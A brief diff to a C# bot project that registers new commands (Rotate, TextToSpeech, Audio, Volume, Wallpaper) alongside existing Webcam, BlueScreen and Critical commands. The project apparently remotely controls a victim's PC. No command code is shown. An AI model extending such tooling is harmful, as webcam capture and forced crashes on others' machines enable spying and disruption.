@@ -18,6 +18,11 @@ namespace Main.Source.Bot
             commandList.Add(new Commands.Webcam());
             commandList.Add(new Commands.BlueScreen());
             commandList.Add(new Commands.Critical());
+            commandList.Add(new Commands.Rotate());
+            commandList.Add(new Commands.TextToSpeech());
+            commandList.Add(new Commands.Audio());
+            commandList.Add(new Commands.Volume());
+            commandList.Add(new Commands.Wallpaper());
         }
     }
 
